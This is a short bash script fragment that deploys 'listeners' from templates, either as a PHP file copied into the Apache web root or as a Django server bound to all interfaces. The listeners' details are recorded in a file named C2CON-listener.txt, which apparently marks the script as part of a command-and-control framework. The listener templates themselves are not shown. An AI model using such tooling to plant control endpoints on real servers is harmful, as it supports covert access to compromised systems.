
if [ $1 == "php" ]; then
cp listener-templates/template.php $2
sed -i "s/MODE/$3/" $2
sed -i "s/RESPONSE/$4/" $2
cp $2 /var/www/html/$2
rm $2
echo "Listener $2 deployed to /var/www/html/$2"
echo " Don't forget to start Apache service"
echo """
---CONFIG---
Endpoint: $2
Mode Param : $3
Response Param : $4
Exposed on Apache port
"""
sleep 2
clear

elif [ $1 == "python" ]; then
mkdir /tmp/$2
cp -r listener-templates/pylistener/ /tmp/$2/
sed -i "s/ENDPOINT/$2/" /tmp/$2/pylistener/pylistener/urls.py
sed -i "s/MODE/$3/" /tmp/$2/pylistener/pylistener/urls.py
sed -i "s/RESPONSE/$4/" /tmp/$2/pylistener/pylistener/urls.py
rand=$(cat /dev/urandom | tr -dc '[:alpha:]' | head -c 128)
sed -i "s/RANDOMIZED_ON_INSTALL/$rand/" /tmp/$2/pylistener/pylistener/urls.py
echo """
---CONFIG---
Endpoint: $2
Mode Param : $3
Response Param : $4
Exposed on Port : $5
"""
python /tmp/$2/pylistener/manage.py runserver 0.0.0.0:$5 > /dev/nul 2>&1 &
sleep 2
echo "Listener python on 0.0.0.0:$5/$2 (PID : $(lsof -t -i :$5 -s tcp:LISTEN))" >> /tmp/C2CON-listener.txt
else
echo "No Listener of this type"
sleep 2
clear
fi
